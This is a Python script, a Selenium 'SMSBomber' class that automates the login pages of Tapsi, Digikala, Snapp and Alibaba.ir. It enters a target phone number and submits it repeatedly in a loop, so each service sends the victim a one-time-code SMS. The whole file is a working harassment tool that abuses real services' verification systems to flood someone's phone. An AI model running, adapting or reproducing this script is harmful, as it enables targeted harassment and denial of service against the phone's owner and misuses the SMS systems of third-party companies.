from time import sleep
from tqdm import tqdm
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
import logging

logging.basicConfig(level=logging.INFO)

class SMSBomber:
    def __init__(self, phone_number, repeat=1):
        self.repeat = repeat
        self.phone_number = phone_number
        self.service = ChromeService("./chromedriver")
        self.driver = webdriver.Chrome(service=self.service)
        self.driver.implicitly_wait(10)  # Set implicit wait
        logging.info("Initialized SMSBomber with phone number: %s and repeat: %d", phone_number, repeat)

    def open_new_tab(self, url):
        logging.info("Opening new tab with URL: %s", url)
        self.driver.execute_script("window.open('about:blank', '_blank');")
        self.driver.switch_to.window(self.driver.window_handles[-1])
        self.driver.get(url)

    def close_current_tab(self):
        logging.info("Closing current tab")
        self.driver.close()
        self.driver.switch_to.window(self.driver.window_handles[0])

    def tapsi(self):
        url = 'https://app.tapsi.cab/?_gl=1*1yb6lc*_ga*MjExNDU1OTQ4My4xNzE0NjU4MDk4*_ga_0F24611KVS*MTcxNDY1ODA5Ny4xLjAuMTcxNDY1ODA5Ny42MC4wLjA.'
        self.open_new_tab(url)
        try:
            input_num = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.ID, "exampleField")))
            input_num.send_keys(self.phone_number)
            button = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, 'BottomButton-container')))
            button.click()
        except Exception as e:
            logging.error("Error in Tapsi: %s", str(e))
        finally:
            sleep(1)
            self.close_current_tab()

    def digikala(self):
        url = 'https://www.digikala.com/users/login/?backUrl=/'
        self.open_new_tab(url)
        try:
            input_num = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
            input_num.send_keys(self.phone_number)
            button = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'ورود')]")))
            button.click()
        except Exception as e:
            logging.error("Error in Digikala: %s", str(e))
        finally:
            sleep(1)
            self.close_current_tab()

    def snapp(self):
        url = 'https://app.snapp.taxi/?utm_source=website&utm_medium=webapp-button&utm_campaign=body'
        self.open_new_tab(url)
        try:
            phone_input_field = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@class=" css-1wf1gx2"]')))
            phone_input_field.clear()
            phone_input_field.send_keys(self.phone_number)
            submit_button = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//button[@class="css-vu4zqq"]')))
            submit_button.click()
        except Exception as e:
            logging.error("Error in Snapp: %s", str(e))
        finally:
            sleep(1)
            self.close_current_tab()

    def alibaba(self):
        url = 'https://www.alibaba.ir/'
        self.open_new_tab(url)
        try:
            button = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//button[@aria-label='ناحیه کاربری null']")))
            button.click()
            input_field = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@class='a-input__input']//input[@type='tel']")))
            input_field.clear()
            input_field.send_keys(self.phone_number)
            submit_button = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.btn.is-lg.is-solid-secondary.is-block.py-3.mb-4")))
            submit_button.click()
        except Exception as e:
            logging.error("Error in Alibaba: %s", str(e))
        finally:
            sleep(1)
            self.close_current_tab()

    def run(self):
        for _ in tqdm(range(self.repeat), desc="Sending SMS"):
            self.tapsi()
            self.digikala()
            # self.torob()
            self.snapp()
            self.alibaba()
            # self.flytoday()
        self.driver.quit()
        logging.info("Finished sending SMS")

